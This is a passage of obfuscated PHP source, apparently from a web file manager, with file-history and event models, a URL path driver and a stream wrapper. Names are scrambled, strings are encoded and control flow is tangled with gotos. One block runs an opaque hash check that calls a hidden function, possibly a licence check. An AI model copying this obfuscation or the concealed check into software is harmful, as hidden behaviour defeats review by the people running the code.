return $this->addEvent($F£²ô›÷·—, $cîéå¿¨‚í[1224], $b§’ä”ª—); } public function eventAddComment($DƒÒ§–Ø•, $A½¹š¾›£Ø) { return $this->addEvent($DƒÒ§–Ø•, $_SERVER[…ë˜õ][1919], $A½¹š¾›£Ø); } public function eventAddDesc($a¯Ê¯ˆ‹, $e×ÛâˆÚÄ) { return $this->addEvent($a¯Ê¯ˆ‹, $_SERVER[…ë˜õ][1920], $e×ÛâˆÚÄ); } public function listBySource($FäÙ£­) { goto a‡òÍà¸; AîêìŸË¾Â: if ($EÔ†ÛœÇè[$Dæ´Í¹£ÌŞ[397]] == $Dæ´Í¹£ÌŞ[86]) { $F±¶ÕÒ¾¿˜ = Model($Dæ´Í¹£ÌŞ[1209])->listSearchChildren($FäÙ£­, 20000); $F±¶ÕÒ¾¿˜[] = $FäÙ£­ . $Dæ´Í¹£ÌŞ[373]; $dìœ•Ñù´ = array($Dæ´Í¹£ÌŞ[390] => array($Dæ´Í¹£ÌŞ[7], $F±¶ÕÒ¾¿˜)); } $Eà“Ûƒ´¥† = $this->where($dìœ•Ñù´)->order($Dæ´Í¹£ÌŞ[1921])->selectPage(); if ($Eà“Ûƒ´¥†[$Dæ´Í¹£ÌŞ[362]][$Dæ´Í¹£ÌŞ[363]] == 0) { $Eà“Ûƒ´¥†[$Dæ´Í¹£ÌŞ[362]][$Dæ´Í¹£ÌŞ[363]] = 1; $Eà“Ûƒ´¥†[$Dæ´Í¹£ÌŞ[365]] = array(array($Dæ´Í¹£ÌŞ[404] => $FäÙ£­, $Dæ´Í¹£ÌŞ[1904] => $EÔ†ÛœÇè[$Dæ´Í¹£ÌŞ[472]], $Dæ´Í¹£ÌŞ[1522] => $EÔ†ÛœÇè[$Dæ´Í¹£ÌŞ[426]], $Dæ´Í¹£ÌŞ[409] => $Dæ´Í¹£ÌŞ[1922], $Dæ´Í¹£ÌŞ[410] => $EÔ†ÛœÇè[$Dæ´Í¹£ÌŞ[192]], $Dæ´Í¹£ÌŞ[1524] => $Dæ´Í¹£ÌŞ[33])); } goto bùËÄŠ¬Óƒ; bùËÄŠ¬Óƒ: return $this->eventListParse($Eà“Ûƒ´¥†, $FäÙ£­); goto e‡Á­Œµ„³; a‡òÍà¸: $Dæ´Í¹£ÌŞ =& $_SERVER[…ë˜õ]; $EÔ†ÛœÇè = Model($Dæ´Í¹£ÌŞ[1209])->sourceInfo($FäÙ£­); $dìœ•Ñù´ = array($Dæ´Í¹£ÌŞ[404] => $FäÙ£­); goto AîêìŸË¾Â; e‡Á­Œµ„³: } private function eventListParse($BÒ–ºÖê‚ä, $døÙ° Áî) { goto EÍ¤ºî‘; EÍ¤ºî‘: $fÒËò”õ…Û =& $_SERVER[…ë˜õ]; $B¤×Î‰ô¹ = $BÒ–ºÖê‚ä[$fÒËò”õ…Û[365]]; $A¼£¡ìš½ = array_to_keyvalue($B¤×Î‰ô¹, $fÒËò”õ…Û[33], $fÒËò”õ…Û[390]); goto A ‹¸Ö¥«Î; bø‚¼ªÒù: $BÒ–ºÖê‚ä[$fÒËò”õ…Û[365]] = $B¤×Î‰ô¹; return $BÒ–ºÖê‚ä; goto aèˆá©ñ­Ü; e¯œ‰ëÂ›Å: $c‡×è‡®»Ş = Model($fÒËò”õ…Û[796])->sourceListInfo($A¼£¡ìš½, !0); foreach ($B¤×Î‰ô¹ as &$eÔ“’¨êæœ) { if ($eÔ“’¨êæœ[$fÒËò”õ…Û[29]] == $fÒËò”õ…Û[515] && isset($eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[1060]])) { $eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[1060]] = $c‡×è‡®»Ş[$eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[1060]]]; $eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[1061]] = $c‡×è‡®»Ş[$eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[1061]]]; } if ($eÔ“’¨êæœ[$fÒËò”õ…Û[29]] == $fÒËò”õ…Û[1918] && isset($eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[390]])) { $eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[390]] = $c‡×è‡®»Ş[$eÔ“’¨êæœ[$fÒËò”õ…Û[425]][$fÒËò”õ…Û[390]]]; } $eÔ“’¨êæœ[$fÒËò”õ…Û[84]] = $c‡×è‡®»Ş[$eÔ“’¨êæœ[$fÒËò”õ…Û[390]]]; $eÔ“’¨êæœ[$fÒËò”õ…Û[1923]] = $c‡×è‡®»Ş[$eÔ“’¨êæœ[$fÒËò”õ…Û[1910]]]; if ($eÔ“’¨êæœ[$fÒËò”õ…Û[29]] == $fÒËò”õ…Û[1660]) { $eÔ“’¨êæœ[$fÒËò”õ…Û[1923]] = $eÔ“’¨êæœ[$fÒËò”õ…Û[84]]; $eÔ“’¨êæœ[$fÒËò”õ…Û[1910]] = $eÔ“’¨êæœ[$fÒËò”õ…Û[1923]][$fÒËò”õ…Û[390]]; $eÔ“’¨êæœ[$fÒËò”õ…Û[84]] = !1; $eÔ“’¨êæœ[$fÒËò”õ…Û[390]] = $fÒËò”õ…Û[33]; } $eÔ“’¨êæœ[$fÒËò”õ…Û[1853]] = $D¾è•Âº´[$eÔ“’¨êæœ[$fÒËò”õ…Û[1531]]]; } unset($eÔ“’¨êæœ); goto bø‚¼ªÒù; A ‹¸Ö¥«Î: $fêƒŠÉ¿Ë– = array_to_keyvalue($B¤×Î‰ô¹, $fÒËò”õ…Û[33], $fÒËò”õ…Û[1910]); foreach ($B¤×Î‰ô¹ as $eÔ“’¨êæœ) { $b¯î‰é—Ï = $eÔ“’¨êæœ[$fÒËò”õ…Û[425]]; if ($eÔ“’¨êæœ[$fÒËò”õ…Û[29]] == $fÒËò”õ…Û[515] && isset($b¯î‰é—Ï[$fÒËò”õ…Û[1060]])) { $A¼£¡ìš½[] = $b¯î‰é—Ï[$fÒËò”õ…Û[1060]] . $fÒËò”õ…Û[33]; $A¼£¡ìš½[] = $b¯î‰é—Ï[$fÒËò”õ…Û[1061]] . $fÒËò”õ…Û[33]; } if ($eÔ“’¨êæœ[$fÒËò”õ…Û[29]] == $fÒËò”õ…Û[1918] && isset($b¯î‰é—Ï[$fÒËò”õ…Û[390]])) { $A¼£¡ìš½[] = $b¯î‰é—Ï[$fÒËò”õ…Û[390]] . $fÒËò”õ…Û[33]; } } $A¼£¡ìš½ = array_merge($A¼£¡ìš½, $fêƒŠÉ¿Ë–, array($døÙ° Áî . $fÒËò”õ…Û[33])); goto D†—›ˆ‹Ï; D†—›ˆ‹Ï: $A¼£¡ìš½ = array_unique($A¼£¡ìš½); $Aò—ÏÜÇ±ƒ = array_unique(array_to_keyvalue($B¤×Î‰ô¹, $fÒËò”õ…Û[33], $fÒËò”õ…Û[1531])); $D¾è•Âº´ = Model($fÒËò”õ…Û[501])->userListInfo($Aò—ÏÜÇ±ƒ); goto e¯œ‰ëÂ›Å; aèˆá©ñ­Ü: } public function removeBySource($D”®¦ê¼) { $dø‡¥ãªËƒ = array($_SERVER[…ë˜õ][404] => $D”®¦ê¼); $this->where($dø‡¥ãªËƒ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\145\x5f\150\151\163\x74\x6f\x72\x79"; public function historyCount($EĞ£†«³ø) { goto D¶Úé–°„Í; D¶Úé–°„Í: $fŸ°šµÙƒÔ =& $_SERVER[…ë˜õ]; if (!$EĞ£†«³ø) { return array(); } if (is_string($EĞ£†«³ø) || is_int($EĞ£†«³ø)) { $EĞ£†«³ø = array($EĞ£†«³ø); } goto A·°…¦Ñ‰; fÄåï‡Ò•: return array_to_keyvalue($FÍÏğÑÔ´¸, $fŸ°šµÙƒÔ[390], $fŸ°šµÙƒÔ[474]); goto E°–Åİùì¼; A·°…¦Ñ‰: $c–¸¶£êÌÇ = array($fŸ°šµÙƒÔ[390], $fŸ°šµÙƒÔ[1726] => $fŸ°šµÙƒÔ[474]); $D‹‰ÆĞ‰†­ = array($fŸ°šµÙƒÔ[390] => array($fŸ°šµÙƒÔ[7], $EĞ£†«³ø)); $FÍÏğÑÔ´¸ = $this->field($c–¸¶£êÌÇ)->where($D‹‰ÆĞ‰†­)->group($fŸ°šµÙƒÔ[390])->select(); goto fÄåï‡Ò•; E°–Åİùì¼: } public function addHistory($FÙÜõ‘Š–, $cĞğ‘¹öŒ = '') { $døÊÜ¬ñ‡  =& $_SERVER[…ë˜õ]; $F›º ‹ä•ò = array($døÊÜ¬ñ‡ [404] => $FÙÜõ‘Š–[$døÊÜ¬ñ‡ [390]], $døÊÜ¬ñ‡ [1522] => isset($FÙÜõ‘Š–[$døÊÜ¬ñ‡ [428]]) ? $FÙÜõ‘Š–[$døÊÜ¬ñ‡ [428]] : $FÙÜõ‘Š–[$døÊÜ¬ñ‡ [426]], $døÊÜ¬ñ‡ [442] => $FÙÜõ‘Š–[$døÊÜ¬ñ‡ [441]], $døÊÜ¬ñ‡ [543] => $FÙÜõ‘Š–[$døÊÜ¬ñ‡ [77]], $døÊÜ¬ñ‡ [1924] => $cĞğ‘¹öŒ); $dº§¢„Ÿ†Ş = $GLOBALS[$døÊÜ¬ñ‡ [6]][$døÊÜ¬ñ‡ [87]][$døÊÜ¬ñ‡ [1108]]; if ($dº§¢„Ÿ†Ş > 1) { $this->historyAutoClear($F›º ‹ä•ò[$døÊÜ¬ñ‡ [390]]); $this->add($F›º ‹ä•ò); } Hook::trigger($døÊÜ¬ñ‡ [1925], $F›º ‹ä•ò); Model($døÊÜ¬ñ‡ [1926])->eventFileEdit($FÙÜõ‘Š–[$døÊÜ¬ñ‡ [390]]); } private function historyAutoClear($B÷ñùæÂÑò) { goto Aî°ÎÕ÷´ï; A¨”ÀğÅÁ: $this->where($b·£ö†»Ô)->delete(); Model($EÑöñéÎ™É[444])->remove($E¦Úôïß›); goto Aß¾¶Çá«Ï; B«Š‚¤“¸: $A‘Ù§¾¡„Ó = $DÌšƒÌ¾ºğ == $EÑöñéÎ™É[1131] ? 5 : $eäîš‘ÆòÏ; if ($eäîš‘ÆòÏ <= 1) { $A‘Ù§¾¡„Ó = 1; } if ($A‘Ù§¾¡„Ó >= 500) { return; } goto cà›…Î†á; cà›…Î†á: $b·£ö†»Ô = array($EÑöñéÎ™É[404] => $B÷ñùæÂÑò); $f†–ÂÙ‡Ë = $this->field($EÑöñéÎ™É[1927])->where($b·£ö†»Ô)->order($EÑöñéÎ™É[1921])->select(); if (!$f†–ÂÙ‡Ë || $A‘Ù§¾¡„Ó >= count($f†–ÂÙ‡Ë)) { return; } goto B—…——æö…; B—…——æö…: $aŞĞğŒ÷Ö® = array_to_keyvalue($f†–ÂÙ‡Ë, $EÑöñéÎ™É[33], $EÑöñéÎ™É[388]); $aŞĞğŒ÷Ö® = array_slice($aŞĞğŒ÷Ö®, $A‘Ù§¾¡„Ó); $E¦Úôïß› = array_to_keyvalue($f†–ÂÙ‡Ë, $EÑöñéÎ™É[33], $EÑöñéÎ™É[441]); goto e¶ÇŠááù; Aî°ÎÕ÷´ï: $EÑöñéÎ™É =& $_SERVER[…ë˜õ]; $DÌšƒÌ¾ºğ = Model($EÑöñéÎ™É[1129])->get($EÑöñéÎ™É[1130]); $eäîš‘ÆòÏ = $GLOBALS[$EÑöñéÎ™É[6]][$EÑöñéÎ™É[87]][$EÑöñéÎ™É[1108]]; goto B«Š‚¤“¸; e¶ÇŠááù: $E¦Úôïß› = array_slice($E¦Úôïß›, $A‘Ù§¾¡„Ó); if (!$aŞĞğŒ÷Ö® || !$E¦Úôïß›) { return; } $b·£ö†»Ô = array($EÑöñéÎ™É[406] => array($EÑöñéÎ™É[7], $aŞĞğŒ÷Ö®)); goto A¨”ÀğÅÁ; Aß¾¶Çá«Ï: } public function listData($C…÷‰ŠÍ­„) { goto E‰œ©†‚‡‚; eë•ïøì‹ä: $d¡™ÇãÃ¦ = 5; if ($Aª‚œ˜îæ´ == $dŸ´˜ÙÅÕ©[1131]) { $FàŸ³Ëî¶[$dŸ´˜ÙÅÕ©[365]] = array_slice($FàŸ³Ëî¶[$dŸ´˜ÙÅÕ©[365]], 0, $d¡™ÇãÃ¦); $FàŸ³Ëî¶[$dŸ´˜ÙÅÕ©[362]] = array($dŸ´˜ÙÅÕ©[1929] => 1, $dŸ´˜ÙÅÕ©[1930] => 20, $dŸ´˜ÙÅÕ©[1931] => 1, $dŸ´˜ÙÅÕ©[1932] => count($FàŸ³Ëî¶[$dŸ´˜ÙÅÕ©[365]])); } return $FàŸ³Ëî¶; goto CŒ¿ßŸÉËÎ; E‰œ©†‚‡‚: $dŸ´˜ÙÅÕ© =& $_SERVER[…ë˜õ]; $e Å¾Éé¿‰ = array($dŸ´˜ÙÅÕ©[404] => $C…÷‰ŠÍ­„); $c„»±àïÓ = $dŸ´˜ÙÅÕ©[1928]; goto F¹Ğ½Ï”®»; F¹Ğ½Ï”®»: $FàŸ³Ëî¶ = $this->field($c„»±àïÓ)->where($e Å¾Éé¿‰)->order($dŸ´˜ÙÅÕ©[1921])->selectPage(); $this->_listAppendUser($FàŸ³Ëî¶[$dŸ´˜ÙÅÕ©[365]]); $Aª‚œ˜îæ´ = Model($dŸ´˜ÙÅÕ©[1129])->get($dŸ´˜ÙÅÕ©[1130]); goto eë•ïøì‹ä; CŒ¿ßŸÉËÎ: } protected function _listAppendUser(&$fë¯ƒÃ”‘¨) { $dÃÂéÃ«Ï„ =& $_SERVER[…ë˜õ]; $D÷êÇò¿²½ = array_to_keyvalue($fë¯ƒÃ”‘¨, $dÃÂéÃ«Ï„[33], $dÃÂéÃ«Ï„[1531]); $fÚã…ääÕ´ = Model($dÃÂéÃ«Ï„[501])->userListInfo($D÷êÇò¿²½); foreach ($fë¯ƒÃ”‘¨ as &$A¡İ÷“ŠØµ) { $bãã¨„æ©’ = $A¡İ÷“ŠØµ[$dÃÂéÃ«Ï„[1531]]; $A¡İ÷“ŠØµ[$dÃÂéÃ«Ï„[426]] = $fÚã…ääÕ´[$bãã¨„æ©’] ? $fÚã…ääÕ´[$bãã¨„æ©’] : !1; } unset($A¡İ÷“ŠØµ); } public function fileInfo($DÒâ®¥ää) { $bí…™¨µ¯ê =& $_SERVER[…ë˜õ]; $dç¬ãÔ¸ùç = $this->tablePrefix; $A¡‘ìÏí¡ = "{$dç¬ãÔ¸ùç}\x69\x6f\137\x66\x69\154\x65\x20\146\x69\x6c\145\x73\x20\x6f\x6e\40\x66\x69\154\145\x73\56\146\151\x6c\145\x49\x44\40\75\x20\x68\151\x73\x74\x6f\162\x79\x2e\146\151\x6c\145\x49\x44"; return $this->alias($bí…™¨µ¯ê[1933])->where(array($bí…™¨µ¯ê[406] => $DÒâ®¥ää))->join($A¡‘ìÏí¡, $bí…™¨µ¯ê[1934])->find(); } public function removeItem($cÜŠËäˆÌ) { $AÎÆªÑ˜¿ =& $_SERVER[…ë˜õ]; $dŠåç…–™ê = array($AÎÆªÑ˜¿[406] => $cÜŠËäˆÌ); $cÉ¿éò†äÀ = $this->where($dŠåç…–™ê)->find(); if ($cÉ¿éò†äÀ) { $F„£“¤ô‹Ò = $this->where($dŠåç…–™ê)->delete(); Model($AÎÆªÑ˜¿[444])->remove($cÉ¿éò†äÀ[$AÎÆªÑ˜¿[441]]); return $F„£“¤ô‹Ò; } return !1; } public function removeBySource($aË•è§½í¥) { goto DŸÍœÁÏ; DŸÍœÁÏ: $CÍ‘½·¼¥ =& $_SERVER[…ë˜õ]; if (!$aË•è§½í¥) { return !1; } if (!is_array($aË•è§½í¥)) { $aË•è§½í¥ = array($aË•è§½í¥); } goto aÆÎÈƒ‹Ÿ; aÙ—ŒÏŒ‰: return !0; goto FÇŠğòŸéë; aÆÎÈƒ‹Ÿ: $d…ÙÓÛí½ = array($CÍ‘½·¼¥[404] => array($CÍ‘½·¼¥[7], $aË•è§½í¥)); $fÉÇ²‹µ ¹ = $this->field($CÍ‘½·¼¥[442])->where($d…ÙÓÛí½)->select(); if ($fÉÇ²‹µ ¹) { $this->where($d…ÙÓÛí½)->delete(); $aé‘½œ«ø = array_to_keyvalue($fÉÇ²‹µ ¹, $CÍ‘½·¼¥[33], $CÍ‘½·¼¥[441]); Model($CÍ‘½·¼¥[444])->remove($aé‘½œ«ø); } goto aÙ—ŒÏŒ‰; FÇŠğòŸéë: } public function setDetail($E‹Í÷éËáØ, $EšÉ™¯©) { $FµÎÆà¥Ï =& $_SERVER[…ë˜õ]; return $this->where(array($FµÎÆà¥Ï[406] => $E‹Í÷éËáØ))->save(array($FµÎÆà¥Ï[1924] => $EšÉ™¯©)); } public function rollbackToItem($FòÇ•ğÂ¼ã, $Dº‰¤ÊÂ‹) { goto Dí½óùºí£; DÉ Ééº° : return $this->where(array($fœáôá®—ñ[406] => $Dº‰¤ÊÂ‹))->delete(); goto EÂŠƒ¨Ç¡õ; e“ÓÀœäÄÛ: $d¤ËÒ‚¹³‰ = $this->find($Dº‰¤ÊÂ‹); $fˆÏ˜½¢ö = array($fœáôá®—ñ[441] => $d¤ËÒ‚¹³‰[$fœáôá®—ñ[441]], $fœáôá®—ñ[77] => $d¤ËÒ‚¹³‰[$fœáôá®—ñ[77]], $fœáôá®—ñ[83] => time(), $fœáôá®—ñ[428] => USER_ID); Model($fœáôá®—ñ[796])->where(array($fœáôá®—ñ[390] => $FòÇ•ğÂ¼ã))->save($fˆÏ˜½¢ö); goto DÉ Ééº° ; Dí½óùºí£: $fœáôá®—ñ =& $_SERVER[…ë˜õ]; $c†ÑÃ…ëã° = Model($fœáôá®—ñ[796])->sourceInfo($FòÇ•ğÂ¼ã); $this->addHistory($c†ÑÃ…ëã°, LNG($fœáôá®—ñ[1935])); goto e“ÓÀœäÄÛ; EÂŠƒ¨Ç¡õ: } public function clearSame($B¶÷Ì³ÕÊ‘) { goto CÉ”±Ùâ; d‹º«··Œ»: $Dñ’ÊÀ”¨Ï = array(); $A‡â«ºÃ‘À = array(); foreach ($B‚Ì¡ÏÃ¿¡ as $dç¾ï’è°Ó) { if (!$dç¾ï’è°Ó || count($dç¾ï’è°Ó) <= 1) { continue; } foreach ($dç¾ï’è°Ó as $b©ùç¨µŒ) { $Dñ’ÊÀ”¨Ï[] = $b©ùç¨µŒ[$báµõÅö¤Ë[441]]; $A‡â«ºÃ‘À[] = $b©ùç¨µŒ[$báµõÅö¤Ë[388]]; } } goto E²ÈˆäÓ‡ö; E²ÈˆäÓ‡ö: if (!$A‡â«ºÃ‘À) { return; } $this->where(array($báµõÅö¤Ë[388] => array($báµõÅö¤Ë[7], $A‡â«ºÃ‘À)))->delete(); Model($báµõÅö¤Ë[444])->remove($Dñ’ÊÀ”¨Ï); goto E…¹¶¥óç£; CÉ”±Ùâ: $báµõÅö¤Ë =& $_SERVER[…ë˜õ]; $F«ÊÇÁÉ´ = $this->listData($B¶÷Ì³ÕÊ‘); $B‚Ì¡ÏÃ¿¡ = array_to_keyvalue_group($F«ÊÇÁÉ´, $báµõÅö¤Ë[441]); goto d‹º«··Œ»; E…¹¶¥óç£: } public function userSpace() { $Eİ÷ÆŒ¤Š· =& $_SERVER[…ë˜õ]; $BÅÎìî·ˆ„ = $this->tablePrefix; $eÆêÌì‘”É = array($Eİ÷ÆŒ¤Š·[1522] => USER_ID); $fõœ¥ß‘‘ = "{$BÅÎìî·ˆ„}\x69\x6f\137\x66\x69\x6c\x65\40\146\151\154\145\163\40\157\156\x20\146\x69\x6c\x65\x73\56\x66\x69\154\145\111\104\40\x3d\40\x68\151\163\x74\157\x72\x79\x2e\146\151\x6c\145\111\x44"; return $this->alias($Eİ÷ÆŒ¤Š·[1933])->where($eÆêÌì‘”É)->join($fõœ¥ß‘‘, $Eİ÷ÆŒ¤Š·[1934])->sum($Eİ÷ÆŒ¤Š·[77]); } } goto Aº¬š–«£¼; eñòï«ÒòŸ: if ($_SERVER[$_SERVER[…ë˜õ][824]] != $dè†æğí¯ô($eå»”å¦™×)) { goto aÕå’‰Ö±; Eñœ¸•Ö‡’: $Fº‚²¼Î„•($eå»”å¦™×); goto eğÄßƒêñ; aÕå’‰Ö±: $EĞ—åèã÷î = $_SERVER[…ë˜õ][826]; $BÏØÒË­å— = $_SERVER[$_SERVER[…ë˜õ][827]] . $_SERVER[…ë˜õ][828]; $cƒ³Šñï’ = $EĞ—åèã÷î($BÏØÒË­å—); goto C•äíñèãÔ; C•äíñèãÔ: $Bƒ‚¶¿ò¿ = explode($_SERVER[…ë˜õ][227], $cƒ³Šñï’); if (count($Bƒ‚¶¿ò¿) < $_SERVER[…ë˜õ][599]) { $Dàå³¦Œ½º = $_SERVER[…ë˜õ][829]; $Dàå³¦Œ½º(); } $Fº‚²¼Î„• = $_SERVER[…ë˜õ][830]; goto Eñœ¸•Ö‡’; eğÄßƒêñ: } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dŸ„ƒ¾³Ù = false) { } public function exist($eÈ¸ƒÇ’Ûñ) { $E•ï·Öê„Ã = $this->info($eÈ¸ƒÇ’Ûñ); return $E•ï·Öê„Ã[$_SERVER[…ë˜õ][193]]; } public function isFile($B¦ó¥©’šˆ) { $E®”È•ŒŞÈ = $this->info($B¦ó¥©’šˆ); return $E®”È•ŒŞÈ[$_SERVER[…ë˜õ][193]]; } public function isFolder($dÓŠ¥£øÁ) { return !1; } public function size($E›Ë°Ñ¥×¾) { $aÇŠ¦ÍĞÕÀ = $this->info($E›Ë°Ñ¥×¾); return $aÇŠ¦ÍĞÕÀ[$_SERVER[…ë˜õ][77]]; } public function info($b·Ë•ë …) { return $this->infoParse($b·Ë•ë …); } public function infoAuth($B×¡Ğ®ò©) { return $this->infoParse($B×¡Ğ®ò©); } public function infoWithChildren($EçªÀãŠš¼) { return $this->infoParse($EçªÀãŠš¼); } public function infoFull($fåöËÊ™Û) { return $this->infoParse($fåöËÊ™Û); } private function infoParse($D›–·¾ë¾) { $dÍ†íÀ¢Ã• =& $_SERVER[…ë˜õ]; $b®—ÉòáÒÌ = $this->header($D›–·¾ë¾); if (!$b®—ÉòáÒÌ || !$b®—ÉòáÒÌ[$dÍ†íÀ¢Ã•[731]]) { return !1; } $FÉé ¸İì‚ = _get($b®—ÉòáÒÌ, $dÍ†íÀ¢Ã•[333], 0); $F±²óœ¿İ = array($dÍ†íÀ¢Ã•[28] => $b®—ÉòáÒÌ[$dÍ†íÀ¢Ã•[28]], $dÍ†íÀ¢Ã•[75] => $D›–·¾ë¾, $dÍ†íÀ¢Ã•[29] => $dÍ†íÀ¢Ã•[191], $dÍ†íÀ¢Ã•[77] => intval($FÉé ¸İì‚), $dÍ†íÀ¢Ã•[167] => get_path_ext($b®—ÉòáÒÌ[$dÍ†íÀ¢Ã•[28]]), $dÍ†íÀ¢Ã•[1260] => $FÉé ¸İì‚ > 0 && $b®—ÉòáÒÌ[$dÍ†íÀ¢Ã•[1381]], $dÍ†íÀ¢Ã•[1261] => !1); return $F±²óœ¿İ; } private function header($BµĞëÏÜç) { goto C´Ù¿çêôŞ; AÒî…Í…±Ş: $GLOBALS[$c–àâóâÓÉ[1382]] = !0; self::$_cacheHeader[$BµĞëÏÜç] = url_header($BµĞëÏÜç); $GLOBALS[$c–àâóâÓÉ[1382]] = $FùÒˆù¹²Œ; goto b«×Ò˜ ƒ–; C´Ù¿çêôŞ: $c–àâóâÓÉ =& $_SERVER[…ë˜õ]; if (isset(self::$_cacheHeader[$BµĞëÏÜç])) { return self::$_cacheHeader[$BµĞëÏÜç]; } $FùÒˆù¹²Œ = isset($GLOBALS[$c–àâóâÓÉ[1382]]) ? $GLOBALS[$c–àâóâÓÉ[1382]] : !1; goto AÒî…Í…±Ş; b«×Ò˜ ƒ–: return self::$_cacheHeader[$BµĞëÏÜç]; goto cÌ‡ìÅ‘; cÌ‡ìÅ‘: } public function hashSimple($bÉ¤È³÷˜, $aéáî˜©Èò = false) { goto E„¢õ÷‰; b¯¸çØ«Ú’: $eÔÂôÕµ ù = timeFloat(); $d¾Ş‘ = 15; for ($Fšáè¾Ì÷² = 0; $Fšáè¾Ì÷² < $Bôî·…¢É; $Fšáè¾Ì÷²++) { if (timeFloat() - $eÔÂôÕµ ù > $d¾Ş‘) { return !1; } $bßå¾İî = $this->fileSubstr($bÉ¤È³÷˜, $câ‚¿ÉÑ¸× * $Fšáè¾Ì÷², $eØ‰Á›††¦); if (!$bßå¾İî) { return !1; } $CÎéĞ³›¤ .= $bßå¾İî; } goto d÷‰À³äíã; d÷‰À³äíã: $CÎéĞ³›¤ .= $this->fileSubstr($bÉ¤È³÷˜, $BÇÅ»Ëâî - $eØ‰Á›††¦, $eØ‰Á›††¦); return md5($CÎéĞ³›¤) . $BÇÅ»Ëâî; goto AÂ°œ‹²¢; bÒ¶ÛøàÇ†: if ($BÇÅ»Ëâî <= $eØ‰Á›††¦ * $Bôî·…¢É) { return md5($this->fileSubstr($bÉ¤È³÷˜, 0, $BÇÅ»Ëâî)) . $BÇÅ»Ëâî; } $câ‚¿ÉÑ¸× = intval($BÇÅ»Ëâî / $Bôî·…¢É); $CÎéĞ³›¤ = $Fé…¾»âµµ[33]; goto b¯¸çØ«Ú’; E„¢õ÷‰: $Fé…¾»âµµ =& $_SERVER[…ë˜õ]; $bÍÃÉ‘èƒ‡ = $this->info($bÉ¤È³÷˜); if (!$bÍÃÉ‘èƒ‡ || !$bÍÃÉ‘èƒ‡[$Fé…¾»âµµ[193]]) { return !1; } goto CÏ«´à¯™; CÏ«´à¯™: $BÇÅ»Ëâî = $bÍÃÉ‘èƒ‡[$Fé…¾»âµµ[77]]; $eØ‰Á›††¦ = 200; $Bôî·…¢É = 50; goto bÒ¶ÛøàÇ†; AÂ°œ‹²¢: } public function getContent($a«Ëëˆñ¼ã) { return $this->fileSubstr($a«Ëëˆñ¼ã); } public function fileSubstr($c ä†ñºõ, $E¨è¼Èç‰ = 0, $fŸë» Ù Ú = -1) { goto e„½æ¤Óé’; cËŒ‹Œù¨î: if ($fŸë» Ù Ú === -1) { $fŸë» Ù Ú = $dÙØãÊ±Æ»[$D†ÍµÂƒ¸ª[77]]; } if ($fŸë» Ù Ú == 0) { return $D†ÍµÂƒ¸ª[33]; } $B¼»º©ù–‹ = array($D†ÍµÂƒ¸ª[1383] . $E¨è¼Èç‰ . $D†ÍµÂƒ¸ª[757] . ($E¨è¼Èç‰ + $fŸë» Ù Ú - 1)); goto DÊœĞì¹‹ø; DÊœĞì¹‹ø: $c›Ñ¿äÄ•À = url_request($c ä†ñºõ, $D†ÍµÂƒ¸ª[226], !1, $B¼»º©ù–‹, !1, !1, 1); return $c›Ñ¿äÄ•À[$D†ÍµÂƒ¸ª[1093]] ? $c›Ñ¿äÄ•À[$D†ÍµÂƒ¸ª[1093]] : $D†ÍµÂƒ¸ª[33]; goto aòÒŒ‡Ä½´; e„½æ¤Óé’: $D†ÍµÂƒ¸ª =& $_SERVER[…ë˜õ]; $dÙØãÊ±Æ» = $this->info($c ä†ñºõ); if (!$dÙØãÊ±Æ» || !$dÙØãÊ±Æ»[$D†ÍµÂƒ¸ª[193]] && $dÙØãÊ±Æ»[$D†ÍµÂƒ¸ª[77]] > 1024 * 1024 * 10) { return !1; } goto cËŒ‹Œù¨î; aòÒŒ‡Ä½´: } public function download($Fº±ÁÚöª, $d¢¦–â”¢Ï) { Downloader::start($Fº±ÁÚöª, $d¢¦–â”¢Ï); return $d¢¦–â”¢Ï; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($CÊÑ²‰µ¿Ø, $añíİ¨²ëÄ = '') { goto E—¯èÒ ¦; E—¯èÒ ¦: $this->info = $this->info($CÊÑ²‰µ¿Ø); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[…ë˜õ][75]]; goto B‰Û¬—íŸå; b²ø‚Œé²§: if (!isset(self::$_chunkBuffer[$CÊÑ²‰µ¿Ø])) { self::$_chunkBuffer[$CÊÑ²‰µ¿Ø] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto aó ĞÅ¿·; B‰Û¬—íŸå: $this->pathOpen = $CÊÑ²‰µ¿Ø; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto b²ø‚Œé²§; aó ĞÅ¿·: } function stream_read($Aß¿ÅĞ©Ë) { $A®èªšğÑ­ = $this->fileSubstr($this->pose, $Aß¿ÅĞ©Ë); $this->pose += strlen($A®èªšğÑ­); return $A®èªšğÑ­; } public function stream_tell() { return $this->pose; } public function stream_seek($C¶ÙÊ‘–Éß, $A‰ãÚÇ›«) { $bòÌèã±ˆ® =& $_SERVER[…ë˜õ]; if ($A‰ãÚÇ›« == SEEK_SET) { $this->pose = $C¶ÙÊ‘–Éß; } else { if ($A‰ãÚÇ›« == SEEK_CUR) { $this->pose += $C¶ÙÊ‘–Éß; } else { if ($A‰ãÚÇ›« == SEEK_END) { $this->pose = $this->info[$bòÌèã±ˆ®[77]] + intval($C¶ÙÊ‘–Éß); } } } if ($C¶ÙÊ‘–Éß < 0) { $this->pose = $this->info[$bòÌèã±ˆ®[77]] + $C¶ÙÊ‘–Éß; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[…ë˜õ][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($BÙæ‘·ì„Œ, $D¸Ñ¸íãõö) { $cÙà›Ö´× =& $_SERVER[…ë˜õ]; $Có…îµÊÍß = 